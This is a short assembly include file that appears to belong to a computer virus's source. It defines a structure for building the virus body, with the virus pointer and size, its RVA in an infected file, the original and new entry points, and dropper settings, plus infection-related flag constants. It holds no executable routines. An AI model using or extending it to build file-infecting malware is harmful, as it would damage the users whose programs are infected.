
EV_MAKEBODY_MORPH       equ     09EFEF93Bh

makebody_info           struc
mbi_vir_ptr             dd      ?       ; ptr to block containing vir
mbi_vir_size            dd      ?       ; vir size
mbi_vir_virtrva         dd      ?       ; RVA of virus in file
mbi_vir_origentry       dd      ?       ; RVA of original entrypoint
mbi_vir_currentry       dd      ?       ; NEW entrypoint (rel. to virtrva)
mbi_flags               dd      ?       ; FL_MBI_xxx
mbi_datom               dd      ?       ; dropper: atom to create, DATOM_xxx
mbi_dsubsys             dd      ?       ; dropper: subsystem, GUI/CUI
                        ends

FL_MBI_SAVEREGS         equ     00000001h   ; used by INFECTB--KME
FL_MBI_RET0C            equ     00000002h   ;

DATOM_ARC               equ     'DA'
DATOM_VIR               equ     'DV'
